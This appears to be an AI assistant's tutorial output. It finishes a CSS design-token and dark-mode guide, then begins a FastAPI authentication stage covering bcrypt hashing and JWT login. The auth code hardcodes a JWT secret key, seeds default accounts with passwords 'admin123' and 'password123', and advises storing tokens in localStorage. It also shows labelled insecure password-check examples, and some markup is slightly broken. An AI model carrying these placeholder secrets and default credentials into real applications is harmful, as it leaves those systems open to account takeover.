}

.stack-sm > * + * {
  margin-top: var(--spacing-2);
}
.stack-lg > * + * {
  margin-top: var(--spacing-8);
}

/* Cluster - horizontal grouping */
.cluster {
  display: flex;
  flex-wrap: wrap;
  gap: var(--spacing-4);
  align-items: center;
}

/* Grid - responsive grid layout */
.grid {
  display: grid;
  gap: var(--spacing-4);
}

.grid-2 {
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
}

.grid-3 {
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
}

/* Flex utilities */
.flex {
  display: flex;
}
.flex-column {
  flex-direction: column;
}
.flex-wrap {
  flex-wrap: wrap;
}
.items-center {
  align-items: center;
}
.justify-center {
  justify-content: center;
}
.justify-between {
  justify-content: space-between;
}
.gap-1 {
  gap: var(--spacing-1);
}
.gap-2 {
  gap: var(--spacing-2);
}
.gap-3 {
  gap: var(--spacing-3);
}
.gap-4 {
  gap: var(--spacing-4);
}
```

**5. Components**

Split into separate files:

`components/buttons.css`:

```css
/**
 * Button Component
 */

.btn {
  /* All button styles from earlier */
}

.btn-primary {
  /* ... */
}
.btn-secondary {
  /* ... */
}
/* etc */
```

`components/forms.css`:

```css
/**
 * Form Components
 */

.form-group {
  /* ... */
}
input[type="text"] {
  /* ... */
}
/* etc */
```

**6. Utilities (utilities.css)**

```css
/**
 * Utility Classes
 * 
 * Single-purpose classes that do one thing.
 * Use sparingly - prefer components.
 */

/* Spacing */
.mt-1 {
  margin-top: var(--spacing-1);
}
.mt-2 {
  margin-top: var(--spacing-2);
}
.mt-3 {
  margin-top: var(--spacing-3);
}
.mt-4 {
  margin-top: var(--spacing-4);
}
.mb-1 {
  margin-bottom: var(--spacing-1);
}
.mb-2 {
  margin-bottom: var(--spacing-2);
}
/* ... etc for all sides and sizes ... */

/* Text alignment */
.text-left {
  text-align: left;
}
.text-center {
  text-align: center;
}
.text-right {
  text-align: right;
}

/* Text colors */
.text-primary {
  color: var(--text-primary);
}
.text-secondary {
  color: var(--text-secondary);
}
.text-success {
  color: var(--status-success);
}
.text-warning {
  color: var(--status-warning);
}
.text-danger {
  color: var(--status-danger);
}

/* Display */
.hidden {
  display: none;
}
.block {
  display: block;
}
.inline-block {
  display: inline-block;
}

/* Width */
.w-full {
  width: 100%;
}
.w-half {
  width: 50%;
}
```

### Import Order in index.html

**CRITICAL:** Load in ITCSS order:

```html
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PDM - Parts Data Management</title>

  <!-- 1. Settings (variables) -->
  <link rel="stylesheet" href="/static/css/tokens.css" />

  <!-- 2. Generic (resets) -->
  <link rel="stylesheet" href="/static/css/reset.css" />

  <!-- 3. Elements (base styles) -->
  <link rel="stylesheet" href="/static/css/base.css" />

  <!-- 4. Objects (layout) -->
  <link rel="stylesheet" href="/static/css/layout.css" />

  <!-- 5. Components -->
  <link rel="stylesheet" href="/static/css/components/buttons.css" />
  <link rel="stylesheet" href="/static/css/components/forms.css" />
  <link rel="stylesheet" href="/static/css/components/modals.css" />
  <link rel="stylesheet" href="/static/css/components/cards.css" />

  <!-- 6. Main styles (old style.css, gradually migrate) -->
  <link rel="stylesheet" href="/static/css/style.css" />

  <!-- 7. Utilities (last - highest specificity) -->
  <link rel="stylesheet" href="/static/css/utilities.css" />
</head>
```

**Or use @import in a single main.css:**

Create `backend/static/css/main.css`:

```css
/* Main stylesheet - imports all others */

@import "tokens.css";
@import "reset.css";
@import "base.css";
@import "layout.css";
@import "components/buttons.css";
@import "components/forms.css";
@import "components/modals.css";
@import "components/cards.css";
@import "style.css";
@import "utilities.css";
```

Then in HTML:

```html
<link rel="stylesheet" href="/static/css/main.css" />
```

### BEM Naming Convention (Optional but Recommended)

**BEM = Block Element Modifier**

```css
/* Block - standalone component */
.card {
}

/* Element - part of block (use __) */
.card__header {
}
.card__body {
}
.card__footer {
}

/* Modifier - variation (use --) */
.card--elevated {
}
.card--compact {
}

/* Combined */
.card__header--large {
}
```

**Example refactor:**

**Before:**

```html
<div class="file-item">
  <span class="file-name">test.mcam</span>
  <span class="file-status">available</span>
</div>
```

**After (BEM):**

```html
<div class="file-item">
  <span class="file-item__name">test.mcam</span>
  <span class="file-item__status file-item__status--available">available</span>
</div>
```

**Why BEM?**

- Clear component boundaries
- Avoids specificity issues
- Self-documenting HTML
- Easy to understand hierarchy

---

## 4B.9: Developer Tools & Shortcuts

### Browser DevTools for Theming

**Chrome DevTools CSS Variables Panel:**

1. Open DevTools (F12)
2. Elements tab
3. Click `:root` in DOM tree
4. Styles panel shows all CSS variables
5. Click color square next to `--color-primary-500`
6. Color picker appears - change color
7. **Entire site updates instantly!**

**Test dark mode without button:**

```javascript
// Console command
document.documentElement.setAttribute("data-theme", "dark");

// Toggle
const current = document.documentElement.getAttribute("data-theme");
document.documentElement.setAttribute(
  "data-theme",
  current === "dark" ? "light" : "dark"
);
```

### VS Code Extensions

**Essential extensions:**

1. **CSS Peek** - Jump to CSS definition
   - Cmd+Click on class name → opens CSS file
2. **Color Highlight** - Shows color previews

   - `--color-primary-500: hsl(245, 70%, 55%);` ← Shows actual color

3. **IntelliSense for CSS Variables**

   - Auto-complete CSS variables as you type

4. **CSS Variable Autocomplete**
   - Suggests CSS variables from your stylesheets

**Install:**

```bash
code --install-extension pranaygp.vscode-css-peek
code --install-extension naumovs.color-highlight
```

### Color Palette Generator Tools

**Don't manually create 9 shades!** Use tools:

**1. Coolors.co Palette Generator**

```
https://coolors.co/
- Generate full palettes
- Export as CSS
- Check accessibility
```

**2. HSL Color Picker with Scales**

```javascript
// Generate scale programmatically
function generateScale(hue, saturation) {
  const lightnesses = [97, 94, 87, 77, 65, 55, 48, 40, 32, 25];

  lightnesses.forEach((l, i) => {
    const index = (i + 1) * 100;
    console.log(
      `--color-primary-${index}: hsl(${hue}, ${saturation}%, ${l}%);`
    );
  });
}

generateScale(245, 70); // Your primary color
```

**3. Material Design Color Tool**

```
https://material.io/resources/color/
- Shows text contrast
- WCAG compliance
- Multiple formats
```

### CSS Variable Playground

Create `backend/static/css-playground.html`:

```html
<!DOCTYPE DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CSS Variable Playground</title>
    <link rel="stylesheet" href="/static/css/tokens.css" />
    <style>
      body {
        padding: 2rem;
        font-family: system-ui;
      }
      .swatch {
        display: inline-block;
        width: 100px;
        height: 100px;
        border-radius: 8px;
        margin: 0.5rem;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      }
      .label {
        font-size: 0.75rem;
        margin-top: 0.5rem;
        text-align: center;
      }
      .controls {
        margin: 2rem 0;
      }
      input[type="range"] {
        width: 300px;
      }
    </style>
  </head>
  <body>
    <h1>CSS Variable Playground</h1>

    <div class="controls">
      <label>
        Hue: <input type="range" id="hue" min="0" max="360" value="245" />
        <span id="hue-value">245</span>° </label
      ><br />

      <label>
        Saturation:
        <input type="range" id="sat" min="0" max="100" value="70" />
        <span id="sat-value">70</span>%
      </label>
    </div>

    <div id="swatches"></div>

    <script>
      const lightnesses = [97, 94, 87, 77, 65, 55, 48, 40, 32, 25];

      function generateSwatches(hue, sat) {
        const container = document.getElementById("swatches");
        container.innerHTML = "";

        lightnesses.forEach((l, i) => {
          const index = (i + 1) * 100;
          const color = `hsl(${hue}, ${sat}%, ${l}%)`;

          const div = document.createElement("div");
          div.innerHTML = `
                    <div class="swatch" style="background: ${color}"></div>
                    <div class="label">${index}<br>${color}</div>
                `;
          container.appendChild(div);
        });
      }

      const hueInput = document.getElementById("hue");
      const satInput = document.getElementById("sat");
      const hueValue = document.getElementById("hue-value");
      const satValue = document.getElementById("sat-value");

      function update() {
        const hue = hueInput.value;
        const sat = satInput.value;
        hueValue.textContent = hue;
        satValue.textContent = sat;
        generateSwatches(hue, sat);
      }

      hueInput.addEventListener("input", update);
      satInput.addEventListener("input", update);

      update();
    </script>
  </body>
</html>
```

**Visit:** `http://localhost:8000/css-playground.html`

Experiment with colors visually!

### Contrast Checker Tool

Add to playground:

```html
<div class="contrast-check">
  <h2>Contrast Checker</h2>
  <div
    style="background: var(--color-primary-500); color: white; padding: 2rem;"
  >
    Text on Primary Background
    <div id="contrast-ratio"></div>
  </div>
</div>

<script>
  function calculateContrast(color1, color2) {
    // Get luminance (simplified)
    function getLuminance(rgb) {
      const [r, g, b] = rgb.map((val) => {
        val = val / 255;
        return val <= 0.03928
          ? val / 12.92
          : Math.pow((val + 0.055) / 1.055, 2.4);
      });
      return 0.2126 * r + 0.7152 * g + 0.0722 * b;
    }

    const l1 = getLuminance(color1);
    const l2 = getLuminance(color2);
    const lighter = Math.max(l1, l2);
    const darker = Math.min(l1, l2);

    return (lighter + 0.05) / (darker + 0.05);
  }

  // Example usage
  const ratio = calculateContrast([102, 126, 234], [255, 255, 255]);
  document.getElementById(
    "contrast-ratio"
  ).textContent = `Contrast: ${ratio.toFixed(2)}:1`;
</script>
```

### Git Workflow for CSS Refactoring

**CRITICAL:** Don't refactor everything in one commit!

```bash
### Create feature branch
git checkout -b css-refactor

### Commit 1: Add token system
git add backend/static/css/tokens.css
git commit -m "Add CSS design token system"

### Commit 2: Add dark mode
git add backend/static/css/tokens.css
git commit -m "Add dark theme tokens"

### Commit 3: Refactor buttons
git add backend/static/css/components/buttons.css
git commit -m "Refactor buttons to use design tokens"

### Commit 4: Refactor forms
git add backend/static/css/components/forms.css
git commit -m "Refactor forms to use design tokens"

### Test at each stage!
### If something breaks, you can git revert the specific commit

### When done:
git checkout main
git merge css-refactor
```

**Why small commits?**

- Easy to find bugs (which commit broke it?)
- Easy to revert (undo just that change)
- Clear history (see what changed when)

---

## 4B.10: Accessibility & Testing

### Testing Color Contrast

**Required ratios:**

```
Normal text (< 18pt):      4.5:1 (AA), 7:1 (AAA)
Large text (18pt+ or 14pt+ bold): 3:1 (AA), 4.5:1 (AAA)
UI components:            3:1 (AA)
```

**Tools:**

**1. Chrome DevTools:**

- Inspect element
- Color picker shows contrast ratio
- ✅ or ❌ indicator for WCAG compliance

**2. WebAIM Contrast Checker:**

```
https://webaim.org/resources/contrastchecker/
```

**3. Automated testing:**

```javascript
// Add to your test suite
describe("Color Contrast", () => {
  it("should meet WCAG AA for all text", () => {
    const styles = window.getComputedStyle(document.documentElement);
    const textColor = styles.getPropertyValue("--text-primary");
    const bgColor = styles.getPropertyValue("--bg-primary");

    const ratio = calculateContrast(textColor, bgColor);
    expect(ratio).toBeGreaterThan(4.5);
  });
});
```

### Testing Dark Mode

**Manual test checklist:**

```
Light Mode:
[ ] Text readable on all backgrounds
[ ] Buttons have sufficient contrast
[ ] Focus states visible
[ ] Status colors distinguishable
[ ] No pure white (#fff) causing glare

Dark Mode:
[ ] Text readable on all backgrounds
[ ] Buttons have sufficient contrast
[ ] Focus states visible (brighter in dark)
[ ] Status colors distinguishable
[ ] No pure black (#000)
[ ] Shadows provide depth
[ ] Images don't look washed out

Both Modes:
[ ] Theme toggle works
[ ] Preference saved to localStorage
[ ] Smooth transition (no flash)
[ ] System preference detected
[ ] All interactive states work
```

### Colorblind Testing

**8% of men are colorblind!**

**Common types:**

- **Deuteranopia** - Red-green (most common)
- **Protanopia** - Red-green
- **Tritanopia** - Blue-yellow
- **Achromatopsia** - Total colorblindness (rare)

**Testing tools:**

**1. Browser extension:**

```
Chrome: "Colorblindly"
Firefox: "Colorblinding"
```

**2. Design in grayscale first:**

```css
/* Test mode - add to body */
body {
  filter: grayscale(100%);
}
```

If UI works in grayscale, colors are supplementary (good!).

**3. Never rely on color alone:**

```html
<!-- ❌ BAD - color is only indicator -->
<span class="status-available">●</span>

<!-- ✅ GOOD - icon + color + text -->
<span class="status-available"> ✓ Available </span>
```

### Reduced Motion

**20-35% of users have motion sensitivity!**

**Respect prefers-reduced-motion:**

```css
/* Default - animations enabled */
.modal {
  animation: slideIn 300ms ease-out;
}

/* User prefers reduced motion - disable */
@media (prefers-reduced-motion: reduce) {
  .modal {
    animation: none;
  }

  /* Or very subtle */
  .modal {
    animation: fadeIn 100ms linear;
  }
}
```

**Test:**

```
Mac: System Preferences → Accessibility → Display → Reduce motion
Windows: Settings → Ease of Access → Display → Show animations
```

### Focus Indicators

**Never remove focus outlines!**

```css
/* ❌ TERRIBLE - breaks keyboard navigation */
*:focus {
  outline: none;
}

/* ✅ GOOD - custom focus that's visible */
*:focus {
  outline: 2px solid var(--border-focus);
  outline-offset: 2px;
}

/* ✅ BETTER - only for keyboard focus */
*:focus-visible {
  outline: 2px solid var(--border-focus);
  outline-offset: 2px;
}

*:focus:not(:focus-visible) {
  outline: none;
}
```

**`:focus-visible`** = Only shows outline when using keyboard (not mouse clicks).

### Performance Testing

**Measure CSS impact:**

```javascript
// Measure render performance
performance.mark("render-start");

// ... DOM changes ...

performance.mark("render-end");
performance.measure("render", "render-start", "render-end");

const measure = performance.getEntriesByName("render")[0];
console.log(`Render took: ${measure.duration}ms`);
```

**CSS file size:**

```bash
### Before
ls -lh backend/static/css/style.css
### 45KB

### After (multiple files)
ls -lh backend/static/css/*.css
### tokens.css: 12KB
### style.css: 18KB
### Total: 30KB (smaller + cacheable)
```

**Minification (production):**

```bash
### Install cssnano
npm install -g cssnano-cli

### Minify
cssnano backend/static/css/main.css backend/static/css/main.min.css

### Before: 45KB
### After: 12KB (73% smaller!)
```

---

## Summary: What You've Built

You now have:

✅ **Complete Design Token System**

- 3-tier token architecture
- Full color palette (9 shades × 5 colors)
- Spacing, typography, shadows, all tokenized

✅ **Dark Mode**

- Properly implemented dark theme
- Respects system preference
- User toggle with localStorage
- Smooth transitions

✅ **Professional CSS Architecture**

- ITCSS methodology
- Organized into layers
- Modular component files
- Maintainable at scale

✅ **Accessibility**

- WCAG AA compliant contrast
- Colorblind-friendly
- Reduced motion support
- Keyboard navigation

✅ **Developer Experience**

- VS Code snippets
- Browser DevTools integration
- Color playground
- Automated refactoring scripts

---

## Next Steps

**Immediate:**

1. Refactor remaining components (one at a time!)
2. Test both themes thoroughly
3. Get user feedback on dark mode
4. Measure performance improvements

**Future Enhancements:**

1. Add more theme variations (high contrast, colorblind modes)
2. Implement theme preview (before applying)
3. Add custom color picker (let users customize)
4. Create design system documentation site

---

## Verification Checklist

- [ ] Design tokens file created and loaded
- [ ] Dark mode tokens defined
- [ ] Theme switcher working
- [ ] Preference saved to localStorage
- [ ] System preference detected
- [ ] All components refactored to use tokens
- [ ] No hardcoded colors in CSS
- [ ] WCAG AA contrast in both modes
- [ ] Smooth theme transitions
- [ ] CSS organized with ITCSS
- [ ] Components in separate files
- [ ] Accessibility tested
- [ ] Performance measured

---

**This is professional-grade CSS architecture.** You can now:

- Change entire color scheme in seconds
- Add new themes easily
- Scale to hundreds of components
- Maintain consistency across the app
- Meet accessibility requirements
- Ship dark mode without breaking anything

**Copy all of this into Stage 4B in your MkDocs.**

Ready to continue with Phase 2 Stage 14?
</artifact>

This is the complete, in-depth guide with all sections. It includes:

1. **Theory** - Understanding CSS variables, color systems, WCAG
2. **Implementation** - Complete design token system
3. **Dark mode** - Proper dark theme with all considerations
4. **JavaScript** - Theme management system
5. **Refactoring** - Step-by-step migration guide
6. **Architecture** - ITCSS and file organization
7. **Tools** - VS Code extensions, color generators, playgrounds
8. **Accessibility** - Contrast, colorblind, reduced motion
9. **Developer shortcuts** - Scripts, snippets, automated refactoring

**Total: ~8,500 words of professional CSS knowledge.**

When you're ready, we can continue with **Stage 14: Background Tasks with Celery**!

---

### Stage 5: Authentication & Authorization - Securing Your Application

## Introduction: The Goal of This Stage

Your app works beautifully, but anyone can pretend to be anyone. There's no login, no passwords, no way to verify identity. This stage transforms your app from open to secure.

By the end of this stage, you will:

- Understand the difference between authentication and authorization
- Implement secure password hashing (never store plain text!)
- Create JWT (JSON Web Token) authentication
- Build a login/logout system
- Protect API endpoints
- Manage user sessions in the frontend
- Implement role-based access control (admin vs user)
- Understand common security vulnerabilities and how to prevent them

**Time Investment:** 6-8 hours

**Warning:** Security is complex. We'll build this carefully, explaining every decision.

---

## 5.1: Authentication vs Authorization - Two Different Problems

### The Definitions

**Authentication (AuthN)** - "Who are you?"

- Verifying identity
- Login process
- Checking credentials (username/password)
- Result: Yes, you are John / No, credentials invalid

**Authorization (AuthZ)** - "What are you allowed to do?"

- Checking permissions
- Happens AFTER authentication
- Based on roles or rules
- Result: Yes, you can delete / No, admins only

### The Analogy

**Airport Security:**

**Authentication** - Showing your ID at the ticket counter

- TSA agent: "Are you really John Doe?"
- Checks your photo ID
- Confirms you are who you claim to be

**Authorization** - Boarding the plane

- Already authenticated (they know who you are)
- Now checking: "Does your ticket allow you on THIS flight?"
- First class vs economy, priority boarding, etc.

### In Our App

**Authentication:**

- User enters username/password
- System verifies credentials
- Issues a token (proof of identity)

**Authorization:**

- User tries to delete a file
- System checks: "Is this user an admin?"
- Allows or denies based on role

---

## 5.2: Password Security - Why Hashing Matters

### The WRONG Way (Never Do This!)

```python
### DANGEROUS - NEVER DO THIS!
users = {
    "john": {
        "password": "MyPassword123"  # Plain text - TERRIBLE!
    }
}

def login(username, password):
    if users[username]["password"] == password:
        return "Success"
```

**Why this is catastrophic:**

1. **Database breach** - Attacker gets ALL passwords
2. **Insider threat** - Admins can see passwords
3. **Password reuse** - Users use same password on other sites
4. **Legal liability** - Violates data protection laws

### The Correct Way: Hashing

**Hash function** - One-way mathematical transformation

```python
password = "MyPassword123"
hash = bcrypt.hash(password)
### Result: "$2b$12$N9qo8uLOickgx2ZMRZoMye..."

### Cannot reverse:
### hash -> ??? (impossible to get original password)

### But can verify:
bcrypt.verify("MyPassword123", hash)  # True
bcrypt.verify("WrongPassword", hash)  # False
```

### How Hashing Works (Deep Dive)

**Step 1: Add Salt**

```
password: "MyPassword123"
salt: "aB3$kL9@"  (random string)
salted: "MyPassword123aB3$kL9@"
```

**Why salt?**

- Prevents rainbow table attacks
- Same password = different hash (due to different salt)
- Salt is stored WITH the hash (it's not secret, just random)

**Step 2: Hash Function**

```
input: "MyPassword123aB3$kL9@"
bcrypt algorithm (many iterations)
output: "$2b$12$N9qo8uLOickgx2ZMRZoMye..."
```

**Step 3: Store**

```python
{
    "john": {
        "password_hash": "$2b$12$N9qo8uLOickgx2ZMRZoMye..."
        # The hash CONTAINS the salt embedded in it
    }
}
```

### Understanding Bcrypt

**The `$2b$12$...` format:**

```
$2b  $12  $salt_and_hash
 │    │         │
 │    │         └─ Salt + Hash combined
 │    └─ Cost factor (2^12 = 4096 iterations)
 └─ Algorithm version
```

**Cost factor:**

- Higher = slower = more secure
- 12 = ~250ms to hash (good balance)
- Protects against brute force (attacker must wait 250ms PER attempt)

**Why bcrypt vs other algorithms?**

| Algorithm  | Why NOT Use                                       |
| ---------- | ------------------------------------------------- |
| MD5        | Too fast (billions of hashes/second on GPU)       |
| SHA-1      | Too fast, collisions found                        |
| SHA-256    | Too fast (designed for files, not passwords)      |
| **bcrypt** | Deliberately slow, includes salt, battle-tested ✓ |
| Argon2     | Even better than bcrypt (newer, more secure)      |

---

## 5.3: Installing Dependencies

### Install Password Hashing

```bash
pip install "passlib[bcrypt]"
```

**What this installs:**

- `passlib` - Password hashing library
- `bcrypt` - The bcrypt algorithm (C extension for speed)

### Install JWT Library

```bash
pip install "python-jose[cryptography]"
```

**What this installs:**

- `python-jose` - JWT encoding/decoding
- `cryptography` - Cryptographic primitives

### Update requirements.txt

```bash
pip freeze > requirements.txt
```

This saves your dependencies so others can install the same versions.

---

## 5.4: User Data Structure

### Create users.json

Create `backend/users.json`:

```json
{
  "admin": {
    "username": "admin",
    "password_hash": "$2b$12$...",
    "full_name": "Administrator",
    "role": "admin"
  },
  "john_doe": {
    "username": "john_doe",
    "password_hash": "$2b$12$...",
    "full_name": "John Doe",
    "role": "user"
  }
}
```

**Note:** We'll generate the actual hashes in code. These are placeholders.

### Create User Management Functions

Add to `main.py`:

```python
from passlib.context import CryptContext
from pathlib import Path
import json

### Configure password hashing
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

### Path to users file
USERS_FILE = BASE_DIR / 'users.json'

### ============================================
### USER MANAGEMENT FUNCTIONS
### ============================================

def load_users() -> dict:
    """Load users from users.json."""
    if not USERS_FILE.exists():
        logger.warning("Users file doesn't exist, creating default admin")
        create_default_users()

    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
        logger.info(f"Loaded {len(users)} users")
        return users
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing users.json: {e}")
        return {}

def save_users(users: dict):
    """Save users to users.json."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        logger.info(f"Saved {len(users)} users")
    except Exception as e:
        logger.error(f"Error saving users: {e}")
        raise

def create_default_users():
    """Create default admin and test user."""
    users = {
        "admin": {
            "username": "admin",
            "password_hash": pwd_context.hash("admin123"),  # Change in production!
            "full_name": "Administrator",
            "role": "admin"
        },
        "john": {
            "username": "john",
            "password_hash": pwd_context.hash("password123"),
            "full_name": "John Doe",
            "role": "user"
        }
    }
    save_users(users)
    logger.info("Created default users: admin, john")

def verify_password(plain_password: str, password_hash: str) -> bool:
    """Verify a password against its hash."""
    return pwd_context.verify(plain_password, password_hash)

def get_user(username: str) -> dict:
    """Get user by username. Returns None if not found."""
    users = load_users()
    return users.get(username)

def authenticate_user(username: str, password: str) -> dict:
    """
    Authenticate user with username and password.
    Returns user dict if valid, None if invalid.
    """
    user = get_user(username)
    if not user:
        logger.info(f"Authentication failed: User '{username}' not found")
        return None

    if not verify_password(password, user["password_hash"]):
        logger.info(f"Authentication failed: Invalid password for '{username}'")
        return None

    logger.info(f"Authentication successful: '{username}'")
    return user
```

### Understanding the Code

**`CryptContext`**

```python
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
```

- Creates a password hashing context
- `schemes=["bcrypt"]` - Use bcrypt algorithm
- `deprecated="auto"` - Handles algorithm upgrades automatically

**Methods:**

- `.hash(password)` - Hash a plain password
- `.verify(plain, hash)` - Check if password matches hash

**Timing Attack Protection**

```python
def verify_password(plain_password: str, password_hash: str) -> bool:
    return pwd_context.verify(plain_password, password_hash)
```

**Bad implementation:**

```python
### VULNERABLE to timing attack
if password == stored_password:
    # Early exit when first character doesn't match
    # Attacker can measure time to guess password character-by-character
```

**bcrypt's `.verify()`:**

- Uses constant-time comparison
- Takes same time whether password is wrong at position 1 or position 10
- Prevents timing attacks

---

## 5.5: JSON Web Tokens (JWT) - Deep Dive

### What is a JWT?

A **JWT** is a compact, URL-safe way to represent claims between two parties.

**Structure:** Three parts separated by dots

```
xxxxx.yyyyy.zzzzz
│     │     │
│     │     └─ Signature
│     └─ Payload (claims)
└─ Header
```

### Real JWT Example

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzAwMDAwMDB9.k7g9j3k2hf9s8d7f6g5h4j3k2l1m0n9o8p7q6r5s4t3
```

### Decoding the JWT

**1. Header (Base64-encoded JSON)**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

Decoded:
{
  "alg": "HS256",  // Signing algorithm
  "typ": "JWT"     // Token type
}
```

**2. Payload (Base64-encoded JSON)**

```
eyJzdWIiOiJqb2huIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzAwMDAwMDB9

Decoded:
{
  "sub": "john",           // Subject (username)
  "role": "user",          // Custom claim
  "exp": 1730000000        // Expiration (Unix timestamp)
}
```

**3. Signature**

```
k7g9j3k2hf9s8d7f6g5h4j3k2l1m0n9o8p7q6r5s4t3

Created by:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
```

### How JWT Authentication Works

```
1. User logs in with username/password
   ↓
2. Server verifies credentials
   ↓
3. Server creates JWT with user info
   ↓
4. Server sends JWT to client
   ↓
5. Client stores JWT (localStorage)
   ↓
6. Client sends JWT with every request (in Authorization header)
   ↓
7. Server verifies JWT signature
   ↓
8. Server extracts user info from JWT
   ↓
9. Server processes request
```

### Why JWT vs Sessions?

**Traditional Sessions:**

```
Client                     Server
  │                          │
  │──── Login ───────────────>│
  │                          │ Create session in DB
  │<── Set-Cookie ───────────│ session_id=abc123
  │                          │
  │──── Request ──────────────>│
  │    Cookie: session_id     │ Look up session in DB
  │                          │ "Is abc123 valid? Who is it?"
```

**Problems with sessions:**

- Server must store sessions (uses memory/database)
- Doesn't scale well (multiple servers need shared session storage)
- Requires database lookup on every request

**JWT Approach:**

```
Client                     Server
  │                          │
  │──── Login ───────────────>│
  │                          │ Sign JWT with secret
  │<── JWT ──────────────────│ token=eyJ...
  │                          │
  │──── Request ──────────────>│
  │    Auth: Bearer eyJ...    │ Verify signature
  │                          │ Extract data from token
  │                          │ (No database lookup!)
```

**Benefits:**

- Stateless (server doesn't store anything)
- Scales horizontally (any server can verify)
- All info is in the token

**Tradeoffs:**

- Can't instantly revoke (must wait for expiration)
- Slightly larger than session ID
- Need to protect secret key

---

## 5.6: Implementing JWT Authentication

### Configuration and Setup

Add to `main.py`:

```python
from datetime import datetime, timedelta, timezone
from jose import JWTError, jwt
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
from pydantic import BaseModel

### ============================================
### JWT CONFIGURATION
### ============================================

### SECRET_KEY: Used to sign JWTs
### CRITICAL: Keep this secret! Never commit to git!
### In production: Use environment variable
SECRET_KEY = "your-secret-key-change-this-in-production-use-env-var"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30

### OAuth2 scheme (tells FastAPI where to find the token)
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")

### ============================================
### PYDANTIC MODELS
### ============================================

class Token(BaseModel):
    access_token: str
    token_type: str

class TokenData(BaseModel):
    username: str
    role: str

class User(BaseModel):
    username: str
    full_name: str
    role: str

### ============================================
### JWT FUNCTIONS
### ============================================

def create_access_token(data: dict, expires_delta: timedelta = None):
    """
    Create a JWT access token.

    Args:
        data: Dictionary to encode (usually username, role)
        expires_delta: How long until token expires

    Returns:
        Encoded JWT string
    """
    to_encode = data.copy()

    # Set expiration time
    if expires_delta:
        expire = datetime.now(timezone.utc) + expires_delta
    else:
        expire = datetime.now(timezone.utc) + timedelta(minutes=15)

    to_encode.update({"exp": expire})

    # Encode the JWT
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

    logger.info(f"Created JWT for data: {data}")
    return encoded_jwt

def decode_access_token(token: str) -> TokenData:
    """
    Decode and verify a JWT token.

    Args:
        token: The JWT string

    Returns:
        TokenData with username and role

    Raises:
        HTTPException if token is invalid or expired
    """
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )

    try:
        # Decode the JWT
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])

        # Extract username
        username: str = payload.get("sub")
        if username is None:
            raise credentials_exception

        # Extract role
        role: str = payload.get("role")
        if role is None:
            raise credentials_exception

        token_data = TokenData(username=username, role=role)

    except JWTError as e:
        logger.error(f"JWT decode error: {e}")
        raise credentials_exception

    return token_data
```

### Understanding the Code

**`OAuth2PasswordBearer`**

```python
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="api/auth/login")
```

- Tells FastAPI: "Tokens come from the `Authorization` header"
- `tokenUrl` - Where to get the token (for API docs)
- Creates a dependency we'll use in endpoints

**JWT Encoding**

```python
encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
```

**What happens:**

1. Serializes `to_encode` dict to JSON
2. Base64-encodes the JSON
3. Creates signature using `SECRET_KEY` and `ALGORITHM`
4. Combines header + payload + signature with `.`

**JWT Decoding**

```python
payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
```

**What happens:**

1. Splits token on `.` into parts
2. Re-computes signature using `SECRET_KEY`
3. Compares computed signature with token's signature
4. If match: signature is valid, return payload
5. If no match: token was tampered with, raise error
6. If expired: `exp` claim is past, raise error

---

## 5.7: Login Endpoint

### Create the Login Route

Add to `main.py`:

```python
@app.post("/api/auth/login", response_model=Token)
def login(form_data: OAuth2PasswordRequestForm = Depends()):
    """
    Login endpoint - authenticates user and returns JWT.

    OAuth2PasswordRequestForm provides:
        - username: str
        - password: str
    """
    logger.info(f"Login attempt for user: {form_data.username}")

    # Authenticate user
    user = authenticate_user(form_data.username, form_data.password)

    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect username or password",
            headers={"WWW-Authenticate": "Bearer"},
        )

    # Create JWT
    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    access_token = create_access_token(
        data={"sub": user["username"], "role": user["role"]},
        expires_delta=access_token_expires
    )

    logger.info(f"Login successful for user: {user['username']}")

    return {
        "access_token": access_token,
        "token_type": "bearer"
    }
```

### Understanding OAuth2PasswordRequestForm

**What is it?**

- FastAPI dependency
- Parses form data (not JSON!)
- Used for OAuth2 password flow

**Why form data?**

- OAuth2 specification requires it
- Compatible with standard OAuth2 clients
- FastAPI's `/docs` can use it

**Request format:**

```
POST /api/auth/login
Content-Type: application/x-www-form-urlencoded

username=john&password=password123
```

**NOT JSON:**

```json
{ "username": "john", "password": "password123" }
```

### Test the Login Endpoint

**Using curl:**

```bash
curl -X POST http://127.0.0.1:8000/api/auth/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123"
```

**Response:**

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

